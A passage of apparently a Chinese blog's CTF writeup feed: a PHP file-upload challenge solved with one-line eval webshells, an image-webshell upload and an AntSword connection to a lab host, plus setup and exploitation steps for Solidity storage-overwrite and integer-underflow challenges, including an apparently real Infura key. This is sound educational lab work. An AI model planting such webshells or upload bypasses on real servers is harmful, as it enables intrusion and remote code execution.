class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);            <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);            <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);            <span class="hljs-comment">//echo $file_name;</span>            <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);            <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>);             <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);            <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>);                        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;                <span class="hljs-variable">$name</span> =<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>] ;                <span class="hljs-comment">//$temp_file = $_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;];</span>                <span class="hljs-comment">//$img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name;</span>                <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);                <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;!&#x27;</span>, <span class="hljs-variable">$content</span>);                                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&quot;upload/&quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]))                &#123;                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;æ–‡ä»¶å·²ç»å­˜åœ¨&#x27;);&lt;/script&gt;&quot;</span>;                &#125;                <span class="hljs-keyword">else</span>&#123;                    <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>], <span class="hljs-string">&quot;assets/images/avatars/&quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]);                    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;assets/images/avatars/&quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>], <span class="hljs-variable">$content</span>);                    <span class="hljs-variable">$helper</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">sqlhelper</span>();                    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;UPDATE  admin SET icon=&#x27;<span class="hljs-subst">$name</span>&#x27; WHERE id=<span class="hljs-subst">$_SESSION</span>[id]&quot;</span>;                    <span class="hljs-variable">$helper</span>-&gt;<span class="hljs-title function_ invoke__">execute_dml</span>(<span class="hljs-variable">$sql</span>);                &#125;            &#125; <span class="hljs-keyword">else</span> &#123;                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;ä¸å…è®¸ä¸Šä¼ çš„ç±»å‹&#x27;);&lt;/script&gt;&quot;</span>;            &#125;        &#125;    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>çœ‹åˆ°å¯¹ä¸Šä¼ æ–‡ä»¶çš„æœ€åä¸€ä¸ª<code>.</code>åé¢çš„æ‰©å±•ååš<strong>é»‘åå•é™åˆ¶</strong>ï¼Œä»¥åŠè¿›è¡Œäº†<strong>å°å†™è½¬æ¢</strong>ã€<strong>ç©ºæ ¼å»é™¤</strong>ã€<strong>ç‰¹æ®Šæ•æ„Ÿå­—ç¬¦æ›¿æ¢</strong>ç­‰æ“ä½œã€‚ç„¶åå°†æœåŠ¡ç«¯æ¥æ”¶åˆ°çš„æ–‡ä»¶å†…å®¹å†™å…¥<code>assets/images/avatars/ä¸Šä¼ çš„æ–‡ä»¶å</code>ã€‚</p><h3 id="3-ä¸Šä¼ "><a href="#3-ä¸Šä¼ " class="headerlink" title="3 ä¸Šä¼ "></a>3 ä¸Šä¼ </h3><ul><li>é¦–å…ˆè®¾è®¡ä¸€å¥è¯æœ¨é©¬ï¼š</li></ul><pre><code class="hljs php"><span class="hljs-comment">// å¸¸è§çš„ä¸€å¥è¯æœ¨é©¬å› ä¸ºæœ‰?è€Œå¤±æ•ˆ</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span>    <span class="hljs-comment">// äºæ˜¯é‡‡ç”¨ä¸‹é¢çš„é©¬,ä¸€ä¸¾ä¸¤å¾—</span>&lt;script language=<span class="hljs-string">&quot;php&quot;</span>&gt;<span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);&lt;/script&gt;</code></pre><ul><li><p>ç„¶åä¸Šä¼ æœ¨é©¬ï¼Œæˆ‘å°è¯•äº†å„ç§å§¿åŠ¿</p><ul><li>burpæ”¹æ–‡ä»¶æ‰©å±•åï¼Œburpæ”¹mime typeéƒ½ä¸è¡Œ</li><li>%00æˆªæ–­ä¹Ÿä¸è¡Œï¼Œè¯´æ˜phpç‰ˆæœ¬å¹¶ä¸ä½</li><li><code>zzy.php. .</code>ç©ºæ ¼ç»•è¿‡ä¹Ÿä¸å¥½ä½¿ï¼Œè™½ç„¶èƒ½ä¸Šä¼ æˆåŠŸï¼Œä½†å¥½åƒè®¿é—®ä¸äº†==</li><li>â€¦</li><li>æœ€åè¿˜æ˜¯é€‰æ‹©ç”¨å›¾ç‰‡é©¬ï¼Œä½¿ç”¨copyå‘½ä»¤åˆå¹¶ä¸º<code>zzy.php.jpg</code>ï¼Œç„¶åç›´æ¥ä¸Šä¼ æˆåŠŸ</li></ul></li></ul><div align=center><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/main/figure-2022/202210061217984.png" style="zoom:60%;" /></div><ul><li><p>ä½¿ç”¨èšå‰‘è¿æ¥æˆåŠŸ</p><ul><li>URLåœ°å€: <a href="http://124.16.75.162:31010/table.php?f=assets/images/avatars/zzy_req.php.jpg">http://124.16.75.162:31010/table.php?f=assets/images/avatars/zzy_req.php.jpg</a></li><li>è¿æ¥å¯†ç : <code>cmd</code></li><li>(ä¸ºäº†ç¡®ä¿ç™»å½•ä¼šè¯çš„æœ‰æ•ˆï¼Œæˆ‘ä¹Ÿåœ¨è¯·æ±‚ä¿¡æ¯é‡Œä¼ å…¥äº†Cookie)</li></ul></li><li><p>åœ¨æ ¹ç›®å½•ä¸‹æ‰¾åˆ°<code>flag&#123;flaaaaaaaaaaaaaaaaaaa.ezweb&#125;</code></p></li></ul><div align=center><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/main/figure-2022/202210061217687.png" style="zoom:60%;" /></div><h2 id="sqli"><a href="#sqli" class="headerlink" title="sqli"></a>sqli</h2><p>TO BE COMPLETED</p><h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="Debuggame"><a href="#Debuggame" class="headerlink" title="Debuggame"></a>Debuggame</h2><p>TO BE COMPLETED</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>NeSE</tag>
      
      <tag>Writeup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NeSEä¸™ç»„CTFæœˆèµ›Writeup</title>
    <link href="/2022/09/25/%E4%B8%99%E7%BB%84CTF%E6%9C%88%E8%B5%9Bwriteup/"/>
    <url>/2022/09/25/%E4%B8%99%E7%BB%84CTF%E6%9C%88%E8%B5%9Bwriteup/</url>
    
    <content type="html"><![CDATA[<p>NeSEæˆ˜é˜Ÿä¸™ç»„æœˆèµ›Writeupï¼ˆåŒ…æ‹¬è§£é¢˜å’Œå‡ºé¢˜ï¼‰</p><span id="more"></span><p>ğŸ•ŠğŸ•ŠğŸ•Šï¼Œä¹‹åçš„æœˆèµ›writeupä¼šæ›´æ–°åœ¨<a href="">ä¹™ç»„CTFæœˆèµ›writeup</a></p><h1 id="202209-è“ä¸™å‡ºé¢˜"><a href="#202209-è“ä¸™å‡ºé¢˜" class="headerlink" title="202209-è“ä¸™å‡ºé¢˜"></a>202209-è“ä¸™å‡ºé¢˜</h1><blockquote><p>çœ‹åˆ°å‰å‡ ä¸ªæœˆçš„ä¸™ç»„æœˆèµ›é‡Œä¼¼ä¹æ²¡æœ‰å‡ºç°è¿‡åŒºå—é“¾ç›¸å…³çš„é¢˜ç›®ï¼Œæ­£å¥½æœ€è¿‘æœ‰äº†è§£ä¸€äº›æ™ºèƒ½åˆçº¦å®‰å…¨ï¼Œæ•…å‚è€ƒchainFlagå‡ºäº†(æ”¹äº†)ä¸¤é“å…¥é—¨çº§åˆçº¦å®‰å…¨èµ›é¢˜</p></blockquote><h2 id="1-EasyCheckin"><a href="#1-EasyCheckin" class="headerlink" title="1 EasyCheckin"></a>1 EasyCheckin</h2><ul><li>è€ƒå¯Ÿå¯¹æ™ºèƒ½åˆçº¦ã€é’±åŒ…è´¦æˆ·ã€è½¬è´¦ã€ä»¥å¤ªåŠäº‹ä»¶ç­‰åŸºç¡€æ¦‚å¿µçš„ç†è§£</li><li>éš¾åº¦ï¼šç­¾åˆ°çº§</li></ul><h3 id="é¢˜ç›®æ­å»º"><a href="#é¢˜ç›®æ­å»º" class="headerlink" title="é¢˜ç›®æ­å»º"></a>é¢˜ç›®æ­å»º</h3><ul><li>git clone <a href="">repo</a>æˆ–è€…ä¸‹è½½<a href="">EasyCheckin.tar.gz</a></li><li>é…ç½®<code>config.py</code>ï¼Œè®¾ç½®infura tokenï¼Œportå’Œflagï¼š</li></ul><pre><code class="hljs python"><span class="hljs-comment"># Your need a infura ropsten key to go on</span>INFURA_ROPSTEN_KEY = <span class="hljs-string">&quot;https://ropsten.infura.io/v3/YOUR_KEY&quot;</span>EasyCheckin_PORT = <span class="hljs-number">31040</span>EasyCheckin_Flag = <span class="hljs-string">&quot;flag&#123;w0w_Y0u_hav3_ch3ck3d_1n&#125;&quot;</span></code></pre><ul><li>build &amp; run å¯åŠ¨é¢˜ç›®docker</li></ul><pre><code class="hljs Dockerfile"><span class="hljs-keyword">FROM</span> ubuntu:<span class="hljs-number">18.04</span><span class="hljs-keyword">LABEL</span><span class="language-bash"> maintainer=<span class="hljs-string">&quot;zhangzhiyu1999@iie.ac.cn&quot;</span></span><span class="hljs-keyword">COPY</span><span class="language-bash"> ./*.py /ctf/</span><span class="hljs-keyword">COPY</span><span class="language-bash"> ./*.txt /ctf/</span><span class="hljs-keyword">COPY</span><span class="language-bash"> ./*.sol /ctf/</span><span class="hljs-comment"># WORKDIR /ctf</span><span class="hljs-keyword">RUN</span><span class="language-bash"> sed -i <span class="hljs-string">&quot;s/archive.ubuntu.com/mirrors.aliyun.com/g&quot;</span> /etc/apt/sources.list \ </span>&amp;&amp; apt update \&amp;&amp; apt install -y python3 python3-pip \&amp;&amp; mkdir -p ~/.pip \&amp;&amp; echo <span class="hljs-string">&quot;&quot;</span> &gt; ~/.pip/pip.conf \&amp;&amp; echo <span class="hljs-string">&quot;[global]&quot;</span> &gt;&gt; ~/.pip/pip.conf \&amp;&amp; echo <span class="hljs-string">&quot;index-url = https://pypi.tuna.tsinghua.edu.cn/simple&quot;</span> &gt;&gt; ~/.pip/pip.conf \&amp;&amp; ln -s /usr/bin/python3 /usr/bin/python \&amp;&amp; ln -s /usr/bin/pip3 /usr/bin/pip \&amp;&amp; python -m pip install --upgrade pip \&amp;&amp; pip install -r /ctf/requirements.txt<span class="hljs-keyword">CMD</span><span class="language-bash">  <span class="hljs-built_in">cd</span> /ctf &amp;&amp; python EasyCheckin_server.py</span><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">31040</span><span class="hljs-comment"># sudo docker build -t smartcontract:challenge1 -f ./Dockerfile .</span><span class="hljs-comment"># sudo docker run -p 31040:31040 --name EasyCheckin -d smartcontract:challenge1</span></code></pre><h3 id="è§£é¢˜è¿‡ç¨‹"><a href="#è§£é¢˜è¿‡ç¨‹" class="headerlink" title="è§£é¢˜è¿‡ç¨‹"></a>è§£é¢˜è¿‡ç¨‹</h3><ol><li>ncæœåŠ¡å™¨ï¼Œé€‰æ‹© 2 ç”Ÿæˆdeployerè´¦æˆ·ï¼Œè®°ä½è´¦æˆ·åœ°å€å’Œç§é’¥</li><li>é€šè¿‡metamaskå·²æœ‰è´¦æˆ·å‘deployerè½¬è´¦0.001 etherç”¨äºéƒ¨ç½²é¢˜ç›®ï¼Œç„¶åé€‰æ‹© 3 éƒ¨ç½²é¢˜ç›®åˆçº¦ï¼Œè®°ä½åˆçº¦åœ°å€</li><li>é€‰æ‹© 1 å¤åˆ¶æºç ï¼Œè¿›å…¥remix web IDEç¼–è¯‘åˆçº¦å¹¶åœ¨deployé¡µé¢é€šè¿‡<code>At Address</code>å¯¼å…¥è¿œç¨‹é“¾ä¸Šé¢˜ç›®åˆçº¦è¿›è¡Œäº¤äº’ï¼ˆæˆ–è€…é€šè¿‡etherscanæ‰“å¼€é¢˜ç›®åˆçº¦å¹¶ä¸”ä¸Šä¼ æºç ï¼Œæ¥å…¥metamaskä¹‹åï¼Œå³å¯åœ¨etherscanè¿›è¡Œäº¤äº’ï¼‰</li><li>è°ƒç”¨setCheckinStrå‡½æ•°å†™å…¥<code>Welcome to EasyCheckin</code>ï¼Œç„¶åè°ƒç”¨isCheckinè§¦å‘passäº‹ä»¶</li></ol><p><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/main/figure-2022/202210051143335.png"/></p><ol><li>æœ€åæäº¤è§¦å‘passäº‹ä»¶çš„äº¤æ˜“å“ˆå¸Œï¼Œè·å¾—<strong>flag{w0w_Y0u_hav3_ch3ck3d_1n}</strong></li></ol><p><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/main/figure-2022/202210051144058.png"/></p><h2 id="2-RichOwners"><a href="#2-RichOwners" class="headerlink" title="2 RichOwners"></a>2 RichOwners</h2><ul><li>è€ƒå¯Ÿsolidityè¯­è¨€åŸºç¡€ã€å¸¸è§æ™ºèƒ½åˆçº¦æ¼æ´åˆ©ç”¨ï¼ˆstorageè¦†ç›–ï¼Œæ•´æ•°æº¢å‡ºç­‰ï¼‰</li><li>éš¾åº¦ï¼šå…¥é—¨çº§</li></ul><h3 id="é¢˜ç›®æ­å»º-1"><a href="#é¢˜ç›®æ­å»º-1" class="headerlink" title="é¢˜ç›®æ­å»º"></a>é¢˜ç›®æ­å»º</h3><ul><li>git clone <a href="">repo</a>æˆ–è€…ä¸‹è½½<a href="">RichOwners.tar.gz</a></li><li>é…ç½®<code>config.py</code>ï¼Œè®¾ç½®infura tokenï¼Œportå’Œflagï¼š</li></ul><pre><code class="hljs python"><span class="hljs-comment"># Your need a infura ropsten key to go on</span>INFURA_ROPSTEN_KEY = <span class="hljs-string">&quot;https://ropsten.infura.io/v3/1b670860e6e645fe9f85efd8f75a0e5a&quot;</span>RichOwners_PORT = <span class="hljs-number">31041</span>RichOwners_Flag = <span class="hljs-string">&quot;flag&#123;St0rage_0verwrit3_and_1nt3ger_und3rfl0w&#125;&quot;</span></code></pre><ul><li>build &amp; run å¯åŠ¨é¢˜ç›®ï¼ŒåŒä¸Š<code>EasyCheckin</code></li></ul><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> docker build -t smartcontract:challenge2 -f ./Dockerfile .<span class="hljs-built_in">sudo</span> docker run -p 31041:31041 --name RichOwners -d smartcontract:challenge2</code></pre><h3 id="è§£é¢˜è¿‡ç¨‹-1"><a href="#è§£é¢˜è¿‡ç¨‹-1" class="headerlink" title="è§£é¢˜è¿‡ç¨‹"></a>è§£é¢˜è¿‡ç¨‹</h3><h4 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h4><p><strong>1 æœªåˆå§‹åŒ–ç»“æ„ä½“å¯¹storageçš„è¦†ç›–</strong></p><p>Solidityè¯­è¨€çš„å˜é‡å­˜å‚¨ä½ç½®åˆ†ä¸ºä¸‰ç§ï¼šstorageï¼Œmemoryå’Œcalldataã€‚storageå­˜å‚¨åœ¨é“¾ä¸Šï¼Œç±»ä¼¼ä¸è®¡ç®—æœºçš„ç¡¬ç›˜ï¼Œå¯¹åˆçº¦å…·å¤‡å…¨å±€å¯è§æ€§ï¼›memoryå’Œcalldataåˆ™æ˜¯å­˜å‚¨åœ¨ä¸´æ—¶çš„å†…å­˜ä¸­ï¼Œä¸ä¸Šé“¾ã€‚</p><p>solidityè¯­è¨€(ä½äº0.4.25)çš„å˜é‡å­˜å‚¨æœ‰ä¸€ä¸ªç‰¹æ€§ï¼Œå³æ•°ç»„ã€æ˜ å°„ã€<strong>ç»“æ„ä½“</strong>ç±»å‹çš„å±€éƒ¨å˜é‡é»˜è®¤æ˜¯å¼•ç”¨åˆçº¦çš„storageï¼Œè€Œå…¨å±€å˜é‡é»˜è®¤æŒ‰ç…§å£°æ˜é¡ºåºå­˜å‚¨åœ¨storageä¸­ã€‚å› æ­¤ï¼Œå¦‚æœè¿™äº›å±€éƒ¨å˜é‡æœªè¢«åˆå§‹åŒ–ï¼Œåˆ™å®ƒä»¬å°†ç›´æ¥æŒ‡å‘storageé¦–éƒ¨ï¼Œä¿®æ”¹æœªåˆå§‹åŒ–çš„è¿™äº›å˜é‡å³å¯å®ç°å¯¹å…¨å±€å˜é‡è¦†ç›–å†™å…¥ã€‚ </p><div class="table-container"><table><thead><tr><th>Storage slot index</th><th>Var</th></tr></thead><tbody><tr><td>0ï¼ˆ â¬… æœªåˆå§‹åŒ–çš„hackerç»“æ„ä½“é»˜è®¤æŒ‡å‘è¿™é‡Œï¼‰</td><td>owner_1  ï¼ˆhacker.hackeraddress1 è¦†ç›–å†™å…¥ï¼‰</td></tr><tr><td>1</td><td>owner_2  ï¼ˆhacker.hackeraddress2 è¦†ç›–å†™å…¥ï¼‰</td></tr><tr><td>2</td><td>owner_3</td></tr><tr><td>3</td><td>owner_4</td></tr><tr><td>â€¦</td><td>â€¦</td></tr></tbody></table></div><p><strong>2 æ•´æ•°ä¸‹æº¢</strong></p><p>å¾ˆç®€å•ï¼Œå¦‚<code>uint(1-2)</code>ä¸‹æº¢</p><p><strong>3 ä»¥å¤ªåŠé’±åŒ…åœ°å€ç”Ÿæˆ(ç¢°æ’å°¾éƒ¨)</strong></p><p>é€šè¿‡è¿™ä¸ªç½‘ç«™(<a href="https://vanity-eth.tk/)å¯ä»¥å®ç°å“ˆå¸Œç¢°æ’çš„é’±åŒ…åœ°å€">https://vanity-eth.tk/)å¯ä»¥å®ç°å“ˆå¸Œç¢°æ’çš„é’±åŒ…åœ°å€</a></p><h4 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h4><ol><li>ncæœåŠ¡å™¨ï¼Œé€‰æ‹© 2 ç”Ÿæˆdeployerè´¦æˆ·ï¼Œè®°ä½è´¦æˆ·åœ°å€å’Œç§é’¥</li><li>é€šè¿‡metamaskå·²æœ‰è´¦æˆ·å‘deployerè½¬è´¦0.001 etherç”¨äºéƒ¨ç½²é¢˜ç›®ï¼Œç„¶åé€‰æ‹© 3 éƒ¨ç½²é¢˜ç›®åˆçº¦ï¼Œè®°ä½åˆçº¦åœ°å€</li><li>é€šè¿‡<a href="https://vanity-eth.tk/ç”Ÿæˆç¢°æ’å°¾éƒ¨åœ°å€çš„é’±åŒ…è´¦æˆ·ï¼Œè®°ä½åœ°å€å’Œç§é’¥ï¼Œå¯¼å…¥metamaskï¼Œç„¶ååœ¨[ropstenæ°´é¾™å¤´](https://faucet.egorfine.com/)å‘è¯¥åœ°å€é¢†å–10ä¸ªropsten">https://vanity-eth.tk/ç”Ÿæˆç¢°æ’å°¾éƒ¨åœ°å€çš„é’±åŒ…è´¦æˆ·ï¼Œè®°ä½åœ°å€å’Œç§é’¥ï¼Œå¯¼å…¥metamaskï¼Œç„¶ååœ¨[ropstenæ°´é¾™å¤´](https://faucet.egorfine.com/)å‘è¯¥åœ°å€é¢†å–10ä¸ªropsten</a> test ether</li><li>é€‰æ‹© 1 å¤åˆ¶æºç ï¼Œè¿›å…¥remix web IDEç¼–è¯‘åˆçº¦å¹¶åœ¨deployé¡µé¢é€šè¿‡<code>At Address</code>å¯¼å…¥è¿œç¨‹é“¾ä¸Šé¢˜ç›®åˆçº¦</li></ol><p><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/main/figure-2022/202210051924026.png"/></p><ol><li>è°ƒç”¨nothingå‡½æ•°ï¼Œå¹¶ä¸”é™„å¸¦1 Finney(ä¹Ÿå³0.001 ether)çš„valueï¼Œåˆ©ç”¨æœªåˆå§‹åŒ–çš„ç»“æ„ä½“å¯¹storageé¦–éƒ¨çš„è¦†ç›–ï¼Œä½¿å¾—owner_1è¢«ä¿®æ”¹ä¸ºäº†msg.senderï¼Œä¹Ÿå³æˆ‘ä»¬è‡ªå·±çš„è´¦æˆ·</li></ol><p><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/main/figure-2022/202209170021209.png" style="zoom: 67%;" /></p><ol><li>åŒä¸Šç†ï¼Œè°ƒç”¨nothingå¹¶é™„å¸¦1 etherï¼Œè¦†ç›–owner_2ä¸ºmsg.sender</li></ol><p><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/main/figure-2022/202209170025135.png" style="zoom:62%;" /></p><ol><li>ç›´æ¥èŠ± 1 ether ä¹°ä¸‹owner_3æ‰€å±æƒ</li></ol><p><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/main/figure-2022/202209170041506.png" style="zoom:70%;" /></p><ol><li>ç”±äºmsg.senderçš„åœ°å€å·²ç»é€šè¿‡ç½‘ç«™è®¾è®¡å¥½ç¢°æ’äº†å°¾éƒ¨ï¼Œå› æ­¤ç›´æ¥é™„å¸¦1 etherè°ƒç”¨deadæ„é€ æ•´æ•°ä¸‹æº¢ï¼Œç„¶åè°ƒç”¨imRichå‡½æ•°ä¹°ä¸‹owner_4</li></ol><p><img src="C:\Users\Zhiyu\AppData\Roaming\Typora\typora-user-images\image-20220917005259333.png" alt="image-20220917005259333" style="zoom:62%;" /></p><ol><li><p>æœ€åè°ƒç”¨payforflagå‡½æ•°ç”ŸæˆGetFlagäº‹ä»¶ï¼Œå¹¶ä¸”å¯ä»¥çœ‹åˆ°åˆçº¦å°†3.001 etherå½’è¿˜ç­”é¢˜é’±åŒ…ï¼Œåˆ çº¦ä½™é¢æ¸…é›¶</p></li><li><p>å¤åˆ¶payforflagçš„transaction hashï¼Œæäº¤è‡³ncæœåŠ¡å™¨æ‹¿åˆ°<strong>flag{St0rage_0verwrit3_and_1nt3ger_und3rfl0w}</strong></p></li></ol>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>NeSE</tag>
      
      <tag>Writeup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç½‘ç»œæ”»é˜²åŸºç¡€CTFæµ‹éªŒWriteup</title>
    <link href="/2022/05/23/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80CTF%E6%B5%8B%E9%AA%8CWriteup/"/>
    <url>/2022/05/23/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80CTF%E6%B5%8B%E9%AA%8CWriteup/</url>
    
    <content type="html"><![CDATA[<p>å›½ç§‘å¤§2022å¹´æ˜¥å­£å­¦æœŸã€Šç½‘ç»œæ”»é˜²åŸºç¡€ã€‹è¯¾ç¨‹CTFæµ‹éªŒwriteupã€‚</p><span id="more"></span><blockquote><p>ã€Šç½‘ç»œæ”»é˜²åŸºç¡€ã€‹æ˜¯ç½‘ç»œç©ºé—´å®‰å…¨å­¦ç§‘ç ”ç©¶ç”Ÿçš„ä¸“ä¸šæ ¸å¿ƒè¯¾ï¼Œä¸»è®²æ•™å¸ˆæœ‰å›½å®¶è®¡ç®—æœºç½‘ç»œå…¥ä¾µé˜²èŒƒä¸­å¿ƒä¸»ä»»å¼ ç‰æ¸…æ•™æˆã€ä¿¡å·¥æ‰€å…­å®¤é¾šæ™“é”é«˜çº§å·¥ç¨‹å¸ˆå’Œä¿¡å·¥æ‰€å›½é‡å´æ§Ÿå‰¯ç ”ç©¶å‘˜ã€‚æœ¬è¯¾ç¨‹è®²æˆè½¯ä»¶å®‰å…¨çš„åŸºæœ¬åŸç†ã€è½¯ä»¶é˜²å¾¡æœºåˆ¶ä¸æ”»å‡»æ‰‹æ®µçš„åšå¼ˆæ¼”è¿›ã€è½¯ä»¶è„†å¼±æ€§ï¼ˆæ¼æ´ï¼‰åŸç†åˆ†æï¼Œä»¥åŠç¡®ä¿è½¯ä»¶å®‰å…¨æ€§çš„æœ€ä½³å®è·µæ–¹æ³•ã€‚è¯¾ç¨‹ä»¥è½¯ä»¶å®‰å…¨å›½é™…çŸ¥åå­¦è€…Gary McGrawçš„ä¸‰éƒ¨è‘—ä½œä¸ºæ•™æï¼Œè®©åŒå­¦é€šè¿‡è¯¾ç¨‹å­¦ä¹ ä¸åŠ¨æ‰‹å®è·µï¼Œæ·±å…¥ç†è§£è½¯ä»¶çš„å®‰å…¨å†…æ„(building security in)æœ¬è´¨ä¸æ–¹æ³•ï¼Œæå‡åœ¨å¼€å‘è¿‡ç¨‹ä¸­ç¡®ä¿è½¯ä»¶å®‰å…¨æ€§çš„ä¸“ä¸šæŠ€èƒ½ï¼›åŒæ—¶ï¼Œç†è§£è½¯ä»¶çš„æ¼æ´åˆ©ç”¨ä¸é˜²èŒƒåœ¨ç½‘ç»œç©ºé—´æ”»é˜²å¯¹æŠ—ä¸­çš„å…³é”®åœ°ä½ï¼ŒæŒæ¡å›´ç»•è½¯ä»¶æ”»é˜²çš„â€œç™½å¸½â€ä¸â€œé»‘å¸½â€æ€ç»´æ–¹æ³•å’ŒåŸºæœ¬æŠ€æœ¯ï¼Œä¸ºè¿›ä¸€æ­¥ç ”ä¹ ç½‘ç»œæ”»é˜²å¥ å®šåŸºç¡€ã€‚</p></blockquote><p>æœ¬æ¬¡CTFæµ‹éªŒå…±åˆ†9ä¸ªå°ç»„ï¼Œæ¯ç»„å„å‡ºä¸€é¢˜ï¼Œå…¶ä¸­æˆ‘ä»¬ç»„å‡ºçš„æ˜¯ä¸€é“dockeré€ƒé€¸çš„miscé¢˜ã€‚</p><h2 id="Crypto-RSA"><a href="#Crypto-RSA" class="headerlink" title="Crypto RSA"></a>Crypto RSA</h2><h3 id="1-é¢˜ç›®åˆ†æ"><a href="#1-é¢˜ç›®åˆ†æ" class="headerlink" title="1 